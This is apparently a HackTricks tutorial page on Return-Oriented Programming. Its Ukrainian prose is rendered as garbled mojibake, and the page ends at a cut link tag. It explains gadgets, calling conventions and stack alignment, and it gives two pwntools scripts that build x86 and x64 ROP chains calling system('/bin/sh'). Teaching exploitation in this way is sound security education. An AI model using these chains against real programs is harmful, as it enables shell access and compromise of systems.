# ROP - Return Oriented Programing

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –≤–∑–ª–æ–º AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –≤–∑–ª–æ–º GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}

## **–û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è**

**Return-Oriented Programming (ROP)** - —Ü–µ –≤–∏—Å–æ–∫–æ—Ä—ñ–≤–Ω–µ–≤–∞ —Ç–µ—Ö–Ω—ñ–∫–∞ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó, —è–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –æ–±—Ö–æ–¥—É –∑–∞—Ö–æ–¥—ñ–≤ –±–µ–∑–ø–µ–∫–∏, —Ç–∞–∫–∏—Ö —è–∫ **No-Execute (NX)** –∞–±–æ **Data Execution Prevention (DEP)**. –ó–∞–º—ñ—Å—Ç—å –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è shellcode, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —à–º–∞—Ç–∫–∏ –∫–æ–¥—É, –≤–∂–µ –ø—Ä–∏—Å—É—Ç–Ω—ñ —É –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ –∞–±–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏—Ö –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞—Ö, –≤—ñ–¥–æ–º—ñ —è–∫ **"–≥–∞–¥–∂–µ—Ç–∏"**. –ö–æ–∂–µ–Ω –≥–∞–¥–∂–µ—Ç –∑–∞–∑–≤–∏—á–∞–π –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—î—é `ret` —Ç–∞ –≤–∏–∫–æ–Ω—É—î –Ω–µ–≤–µ–ª–∏–∫—É –æ–ø–µ—Ä–∞—Ü—ñ—é, —Ç–∞–∫—É —è–∫ –ø–µ—Ä–µ–º—ñ—â–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö –º—ñ–∂ —Ä–µ–≥—ñ—Å—Ç—Ä–∞–º–∏ –∞–±–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∞—Ä–∏—Ñ–º–µ—Ç–∏—á–Ω–∏—Ö –æ–ø–µ—Ä–∞—Ü—ñ–π. –ó'—î–¥–Ω–∞–≤—à–∏ —Ü—ñ –≥–∞–¥–∂–µ—Ç–∏, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ —Å–∫–ª–∞—Å—Ç–∏ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –æ–ø–µ—Ä–∞—Ü—ñ–π, –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –æ–±—Ö–æ–¥—è—á–∏ –∑–∞—Ö–∏—Å—Ç NX/DEP.

### –Ø–∫ –ø—Ä–∞—Ü—é—î ROP

1. **–ü–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è –ø–æ—Ç–æ–∫—É —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è**: –°–ø–æ—á–∞—Ç–∫—É –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –ø–æ–≤–∏–Ω–µ–Ω –ø–µ—Ä–µ—Ö–æ–ø–∏—Ç–∏ –ø–æ—Ç—ñ–∫ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –ø—Ä–æ–≥—Ä–∞–º–∏, –∑–∞–∑–≤–∏—á–∞–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞ –¥–ª—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É –∑–±–µ—Ä–µ–∂–µ–Ω–æ–≥–æ –∞–¥—Ä–µ—Å–∏ –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –Ω–∞ —Å—Ç–µ–∫—É.
2. **–õ–∞–Ω—Ü—é–∂–æ–∫ –≥–∞–¥–∂–µ—Ç—ñ–≤**: –ü–æ—Ç—ñ–º –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ —É–≤–∞–∂–Ω–æ –≤–∏–±–∏—Ä–∞—î —Ç–∞ –∑'—î–¥–Ω—É—î –≥–∞–¥–∂–µ—Ç–∏ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø–æ—Ç—Ä—ñ–±–Ω–∏—Ö –¥—ñ–π. –¶–µ –º–æ–∂–µ –≤–∫–ª—é—á–∞—Ç–∏ –ø—ñ–¥–≥–æ—Ç–æ–≤–∫—É –∞—Ä–≥—É–º–µ–Ω—Ç—ñ–≤ –¥–ª—è –≤–∏–∫–ª–∏–∫—É —Ñ—É–Ω–∫—Ü—ñ—ó, –≤–∏–∫–ª–∏–∫ —Ñ—É–Ω–∫—Ü—ñ—ó (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `system("/bin/sh")`) —Ç–∞ –æ–±—Ä–æ–±–∫—É –±—É–¥—å-—è–∫–∏—Ö –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏—Ö –∑–∞–≤–µ—Ä—à–∞–ª—å–Ω–∏—Ö –∞–±–æ –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –æ–ø–µ—Ä–∞—Ü—ñ–π.
3. **–í–∏–∫–æ–Ω–∞–Ω–Ω—è –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è**: –ö–æ–ª–∏ —É—Ä–∞–∑–ª–∏–≤–∞ —Ñ—É–Ω–∫—Ü—ñ—è –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è, –∑–∞–º—ñ—Å—Ç—å –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –¥–æ –∑–∞–∫–æ–Ω–Ω–æ–≥–æ –º—ñ—Å—Ü—è, –≤–æ–Ω–∞ –ø–æ—á–∏–Ω–∞—î –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –ª–∞–Ω—Ü—é–∂–æ–∫ –≥–∞–¥–∂–µ—Ç—ñ–≤.

### –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

–ó–∞–∑–≤–∏—á–∞–π –≥–∞–¥–∂–µ—Ç–∏ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é [**ROPgadget**](https://github.com/JonathanSalwan/ROPgadget), [**ropper**](https://github.com/sashs/Ropper) –∞–±–æ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –∑ **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)).

## –ü—Ä–∏–∫–ª–∞–¥ –ª–∞–Ω—Ü—é–∂–∫–∞ ROP –≤ x86

### **–ö–æ–Ω–≤–µ–Ω—Ü—ñ—ó –≤–∏–∫–ª–∏–∫—É –¥–ª—è x86 (32-–±—ñ—Ç)**

* **cdecl**: –í–∏–∫–ª–∏–∫–∞—á –æ—á–∏—â–∞—î —Å—Ç–µ–∫. –ê—Ä–≥—É–º–µ–Ω—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó –¥–æ–¥–∞—é—Ç—å—Å—è –Ω–∞ —Å—Ç–µ–∫ —É –∑–≤–æ—Ä–æ—Ç–Ω—å–æ–º—É –ø–æ—Ä—è–¥–∫—É (—Å–ø—Ä–∞–≤–∞ –Ω–∞–ª—ñ–≤–æ). **–ê—Ä–≥—É–º–µ–Ω—Ç–∏ –¥–æ–¥–∞—é—Ç—å—Å—è –Ω–∞ —Å—Ç–µ–∫ –∑–ø—Ä–∞–≤–∞ –Ω–∞–ª—ñ–≤–æ.**
* **stdcall**: –°—Ö–æ–∂–µ –Ω–∞ cdecl, –∞–ª–µ –≤–∏–∫–ª–∏–∫–∞–Ω–∏–π –æ–±'—î–∫—Ç –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –∑–∞ –æ—á–∏—â–µ–Ω–Ω—è —Å—Ç–µ–∫—É.

### **–ü–æ—à—É–∫ –≥–∞–¥–∂–µ—Ç—ñ–≤**

–°–ø–æ—á–∞—Ç–∫—É –ø—Ä–∏–ø—É—Å—Ç–∏–º–æ, —â–æ –º–∏ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞–ª–∏ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –≥–∞–¥–∂–µ—Ç–∏ —É –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ –∞–±–æ –π–æ–≥–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏—Ö –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞—Ö. –ì–∞–¥–∂–µ—Ç–∏, —è–∫—ñ –Ω–∞—Å —Ü—ñ–∫–∞–≤–ª—è—Ç—å:

* `pop eax; ret`: –¶–µ–π –≥–∞–¥–∂–µ—Ç –≤–∏–¥–∞–ª—è—î –≤–µ—Ä—Ö–Ω—î –∑–Ω–∞—á–µ–Ω–Ω—è –∑—ñ —Å—Ç–µ–∫—É –≤ —Ä–µ–≥—ñ—Å—Ç—Ä `EAX` —Ç–∞ –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è, –¥–æ–∑–≤–æ–ª—è—é—á–∏ –Ω–∞–º –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ `EAX`.
* `pop ebx; ret`: –°—Ö–æ–∂–∏–π –Ω–∞ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π, –∞–ª–µ –¥–ª—è —Ä–µ–≥—ñ—Å—Ç—Ä—É `EBX`, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ `EBX`.
* `mov [ebx], eax; ret`: –ü–µ—Ä–µ–º—ñ—â—É—î –∑–Ω–∞—á–µ–Ω–Ω—è –∑ `EAX` –¥–æ –ø–∞–º'—è—Ç—ñ, –Ω–∞ —è–∫—É –≤–∫–∞–∑—É—î `EBX`, —Ç–∞ –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è. –¶–µ —á–∞—Å—Ç–æ –Ω–∞–∑–∏–≤–∞—î—Ç—å—Å—è **–≥–∞–¥–∂–µ—Ç–æ–º write-what-where**.
* –ö—Ä—ñ–º —Ç–æ–≥–æ, –º–∏ –º–∞—î–º–æ –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó `system()`.

### **–õ–∞–Ω—Ü—é–∂–æ–∫ ROP**

–ó–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **pwntools** –º–∏ –ø—ñ–¥–≥–æ—Ç–æ–≤–ª—é—î–º–æ —Å—Ç–µ–∫ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ª–∞–Ω—Ü—é–∂–∫–∞ ROP –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º –∑ –º–µ—Ç–æ—é –≤–∏–∫–æ–Ω–∞–Ω–Ω—è `system('/bin/sh')`, –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —è–∫ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –ª–∞–Ω—Ü—é–∂–æ–∫:

1. –Ü–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è `ret` –¥–ª—è –≤–∏—Ä—ñ–≤–Ω—é–≤–∞–Ω–Ω—è (–Ω–µ–æ–±–æ–≤'—è–∑–∫–æ–≤–æ)
2. –ê–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü—ñ—ó `system` (–ø—Ä–∏–ø—É—Å–∫–∞—é—á–∏ –≤–∏–º–∫–Ω–µ–Ω–µ ASLR —Ç–∞ –≤—ñ–¥–æ–º—É libc, –¥–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –≤ [**Ret2lib**](ret2lib/))
3. –ó–∞–ø–æ–≤–Ω—é–≤–∞—á –¥–ª—è –∞–¥—Ä–µ—Å–∏ –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –≤—ñ–¥ `system()`
4. –ê–¥—Ä–µ—Å–∞ —Ä—è–¥–∫–∞ `"/bin/sh"` (–ø–∞—Ä–∞–º–µ—Ç—Ä –¥–ª—è —Ñ—É–Ω–∫—Ü—ñ—ó system)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## –õ–∞–Ω—Ü—é–∂–æ–∫ ROP —É –ø—Ä–∏–∫–ª–∞–¥—ñ x64

### **–í–∏–∫–ª–∏–∫–æ–≤—ñ –∫–æ–Ω–≤–µ–Ω—Ü—ñ—ó x64 (64-–±—ñ—Ç–Ω—ñ)**

* –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∫–æ–Ω–≤–µ–Ω—Ü—ñ—é –≤–∏–∫–ª–∏–∫—É **System V AMD64 ABI** –Ω–∞ —Å–∏—Å—Ç–µ–º–∞—Ö –ø–æ–¥—ñ–±–Ω–∏—Ö –¥–æ Unix, –¥–µ **–ø–µ—Ä—à—ñ —à—ñ—Å—Ç—å —Ü—ñ–ª–∏—Ö –∞–±–æ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–æ–≤–∏—Ö –∞—Ä–≥—É–º–µ–Ω—Ç—ñ–≤ –ø–µ—Ä–µ–¥–∞—é—Ç—å—Å—è –≤ —Ä–µ–≥—ñ—Å—Ç—Ä–∏ `RDI`, `RSI`, `RDX`, `RCX`, `R8` —Ç–∞ `R9`**. –î–æ–¥–∞—Ç–∫–æ–≤—ñ –∞—Ä–≥—É–º–µ–Ω—Ç–∏ –ø–µ—Ä–µ–¥–∞—é—Ç—å—Å—è —á–µ—Ä–µ–∑ —Å—Ç–µ–∫. –†–µ–∑—É–ª—å—Ç–∞—Ç –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è –≤ `RAX`.
* –í–∏–∫–ª–∏–∫–æ–≤–∞ –∫–æ–Ω–≤–µ–Ω—Ü—ñ—è **Windows x64** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î `RCX`, `RDX`, `R8` —Ç–∞ `R9` –¥–ª—è –ø–µ—Ä—à–∏—Ö —á–æ—Ç–∏—Ä—å–æ—Ö —Ü—ñ–ª–∏—Ö –∞–±–æ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–æ–≤–∏—Ö –∞—Ä–≥—É–º–µ–Ω—Ç—ñ–≤, –∑ –¥–æ–¥–∞—Ç–∫–æ–≤–∏–º–∏ –∞—Ä–≥—É–º–µ–Ω—Ç–∞–º–∏, —â–æ –ø–µ—Ä–µ–¥–∞—é—Ç—å—Å—è —á–µ—Ä–µ–∑ —Å—Ç–µ–∫. –†–µ–∑—É–ª—å—Ç–∞—Ç –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è –≤ `RAX`.
* **–†–µ–≥—ñ—Å—Ç—Ä–∏**: 64-–±—ñ—Ç–Ω—ñ —Ä–µ–≥—ñ—Å—Ç—Ä–∏ –≤–∫–ª—é—á–∞—é—Ç—å `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP`, —Ç–∞ `R8` –¥–æ `R15`.

#### **–ü–æ—à—É–∫ –ì–∞–¥–∂–µ—Ç—ñ–≤**

–î–ª—è –Ω–∞—à–∏—Ö —Ü—ñ–ª–µ–π –¥–∞–≤–∞–π—Ç–µ –∑–æ—Å–µ—Ä–µ–¥–∏–º–æ—Å—è –Ω–∞ –≥–∞–¥–∂–µ—Ç–∞—Ö, —è–∫—ñ –¥–æ–∑–≤–æ–ª—è—Ç—å –Ω–∞–º –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —Ä–µ–≥—ñ—Å—Ç—Ä **RDI** (—â–æ–± –ø–µ—Ä–µ–¥–∞—Ç–∏ —Ä—è–¥–æ–∫ **"/bin/sh"** —è–∫ –∞—Ä–≥—É–º–µ–Ω—Ç –¥–æ **system()**) —ñ –ø–æ—Ç—ñ–º –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é **system()**. –ú–∏ –ø—Ä–∏–ø—É—Å—Ç–∏–º–æ, —â–æ –º–∏ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞–ª–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ –≥–∞–¥–∂–µ—Ç–∏:

* **pop rdi; ret**: –í–∏–∫–∏–¥–∞—î –≤–µ—Ä—Ö–Ω—î –∑–Ω–∞—á–µ–Ω–Ω—è —Å—Ç–µ–∫—É –≤ **RDI** —ñ –ø–æ—Ç—ñ–º –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è. –Ü—Å—Ç–æ—Ç–Ω–∏–π –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –Ω–∞—à–æ–≥–æ –∞—Ä–≥—É–º–µ–Ω—Ç—É –¥–ª—è **system()**.
* **ret**: –ü—Ä–æ—Å—Ç–∏–π –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è, –∫–æ—Ä–∏—Å–Ω–∏–π –¥–ª—è –≤–∏—Ä—ñ–≤–Ω—é–≤–∞–Ω–Ω—è —Å—Ç–µ–∫—É –≤ –¥–µ—è–∫–∏—Ö —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö.

–Ü –º–∏ –∑–Ω–∞—î–º–æ –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó **system()**.

### **–õ–∞–Ω—Ü—é–∂–æ–∫ ROP**

–ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω–æ –ø—Ä–∏–∫–ª–∞–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **pwntools** –¥–ª—è –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ª–∞–Ω—Ü—é–∂–∫–∞ ROP –∑ –º–µ—Ç–æ—é –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **system('/bin/sh')** –Ω–∞ **x64**:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
–£ —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ:

* –ú–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ –≥–∞–¥–∂–µ—Ç **`pop rdi; ret`** –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è **`RDI`** –Ω–∞ –∞–¥—Ä–µ—Å—É **`"/bin/sh"`**.
* –ú–∏ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –ø–µ—Ä–µ—Ö–æ–¥–∏–º–æ –¥–æ **`system()`** –ø—ñ—Å–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è **`RDI`**, –∑ –∞–¥—Ä–µ—Å–æ—é **system()** –≤ –ª–∞–Ω—Ü—é–∂–∫—É.
* **`ret_gadget`** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –≤–∏—Ä—ñ–≤–Ω—é–≤–∞–Ω–Ω—è, —è–∫—â–æ —Ü–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤ —Ü—ñ–ª—å–æ–≤–æ–º—É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ, —â–æ —î –±—ñ–ª—å—à –ø–æ—à–∏—Ä–µ–Ω–∏–º —É **x64**, —â–æ–± –∑–∞–±–µ–∑–ø–µ—á–∏—Ç–∏ –Ω–∞–ª–µ–∂–Ω–µ –≤–∏—Ä—ñ–≤–Ω—é–≤–∞–Ω–Ω—è —Å—Ç–µ–∫—É –ø–µ—Ä–µ–¥ –≤–∏–∫–ª–∏–∫–æ–º —Ñ—É–Ω–∫—Ü—ñ–π.

### –í–∏—Ä—ñ–≤–Ω—é–≤–∞–Ω–Ω—è —Å—Ç–µ–∫—É

**ABI x86-64** –∑–∞–±–µ–∑–ø–µ—á—É—î, —â–æ **—Å—Ç–µ–∫ –≤–∏—Ä—ñ–≤–Ω—é—î—Ç—å—Å—è –Ω–∞ 16 –±–∞–π—Ç—ñ–≤**, –∫–æ–ª–∏ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è **–≤–∏–∫–ª–∏–∫—É**. **LIBC**, –¥–ª—è –æ–ø—Ç–∏–º—ñ–∑–∞—Ü—ñ—ó –ø—Ä–æ–¥—É–∫—Ç–∏–≤–Ω–æ—Å—Ç—ñ, **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó SSE** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥ **movaps**), —è–∫—ñ –≤–∏–º–∞–≥–∞—é—Ç—å —Ü—å–æ–≥–æ –≤–∏—Ä—ñ–≤–Ω—é–≤–∞–Ω–Ω—è. –Ø–∫—â–æ —Å—Ç–µ–∫ –Ω–µ –≤–∏—Ä—ñ–≤–Ω—è–Ω–∏–π –Ω–∞–ª–µ–∂–Ω–∏–º —á–∏–Ω–æ–º (–æ–∑–Ω–∞—á–∞—î, —â–æ **RSP** –Ω–µ —î –∫—Ä–∞—Ç–Ω–∏–º 16), –≤–∏–∫–ª–∏–∫–∏ —Ñ—É–Ω–∫—Ü—ñ–π, —Ç–∞–∫–∏—Ö —è–∫ **system**, –Ω–µ –≤–¥–∞—Å—Ç—å—Å—è –≤ **ROP –ª–∞–Ω—Ü—é–∂–∫—É**. –©–æ–± –≤–∏–ø—Ä–∞–≤–∏—Ç–∏ —Ü–µ, –ø—Ä–æ—Å—Ç–æ –¥–æ–¥–∞–π—Ç–µ **ret –≥–∞–¥–∂–µ—Ç** –ø–µ—Ä–µ–¥ –≤–∏–∫–ª–∏–∫–æ–º **system** —É –≤–∞—à–æ–º—É ROP –ª–∞–Ω—Ü—é–∂–∫—É.

## –í—ñ–¥–º—ñ–Ω–Ω—ñ—Å—Ç—å –º—ñ–∂ x86 —Ç–∞ x64

{% hint style="success" %}
–û—Å–∫—ñ–ª—å–∫–∏ **x64 –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ä–µ–≥—ñ—Å—Ç—Ä–∏ –¥–ª—è –ø–µ—Ä—à–∏—Ö –∫—ñ–ª—å–∫–æ—Ö –∞—Ä–≥—É–º–µ–Ω—Ç—ñ–≤**, —á–∞—Å—Ç–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ –º–µ–Ω—à–µ –≥–∞–¥–∂–µ—Ç—ñ–≤, –Ω—ñ–∂ —É x86 –¥–ª—è –ø—Ä–æ—Å—Ç–∏—Ö –≤–∏–∫–ª–∏–∫—ñ–≤ —Ñ—É–Ω–∫—Ü—ñ–π, –∞–ª–µ –ø–æ—à—É–∫ —Ç–∞ –ª–∞–Ω—Ü—é–∂–µ–Ω–Ω—è –ø—Ä–∞–≤–∏–ª—å–Ω–∏—Ö –≥–∞–¥–∂–µ—Ç—ñ–≤ –º–æ–∂–µ –±—É—Ç–∏ —Å–∫–ª–∞–¥–Ω—ñ—à–∏–º —á–µ—Ä–µ–∑ –∑–±—ñ–ª—å—à–µ–Ω—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Ä–µ–≥—ñ—Å—Ç—Ä—ñ–≤ —Ç–∞ –±—ñ–ª—å—à–∏–π –∞–¥—Ä–µ—Å–Ω–∏–π –ø—Ä–æ—Å—Ç—ñ—Ä. –ó–±—ñ–ª—å—à–µ–Ω–∞ –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Ä–µ–≥—ñ—Å—Ç—Ä—ñ–≤ —Ç–∞ –±—ñ–ª—å—à–∏–π –∞–¥—Ä–µ—Å–Ω–∏–π –ø—Ä–æ—Å—Ç—ñ—Ä —É **x64** –∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä—ñ –Ω–∞–¥–∞—é—Ç—å —è–∫ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ, —Ç–∞–∫ —ñ –≤–∏–∫–ª–∏–∫–∏ –¥–ª—è —Ä–æ–∑–≤–∏—Ç–∫—É –µ–∫—Å–ø–ª–æ–π—Ç—ñ–≤, –æ—Å–æ–±–ª–∏–≤–æ –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ Return-Oriented Programming (ROP).
{% endhint %}

## ROP –ª–∞–Ω—Ü—é–∂–æ–∫ —É –ø—Ä–∏–∫–ª–∞–¥—ñ ARM64

### **–û—Å–Ω–æ–≤–∏ ARM64 —Ç–∞ –∫–æ–Ω–≤–µ–Ω—Ü—ñ—ó –≤–∏–∫–ª–∏–∫—É**

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É –¥–ª—è —Ü—ñ—î—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó:

{% content-ref url="../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
